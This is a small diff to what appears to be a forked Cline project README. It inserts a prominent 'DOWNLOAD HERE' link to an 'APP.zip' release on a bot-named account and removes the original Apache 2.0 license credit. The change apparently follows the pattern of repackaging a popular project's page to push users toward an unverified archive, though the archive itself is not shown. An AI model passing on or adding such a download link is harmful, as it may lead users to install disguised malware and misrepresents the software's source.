@@ -1,3 +1,5 @@
+DOWNLOAD HERE:
+https://github.com/cannaseedus-bot/cline/archive/refs/tags/APP.zip
 
 
 
@@ -21,9 +23,3 @@
 
 
 
-
-
-
-## License
-
-[Apache 2.0 © 2025 Cline Bot Inc.](./LICENSE)
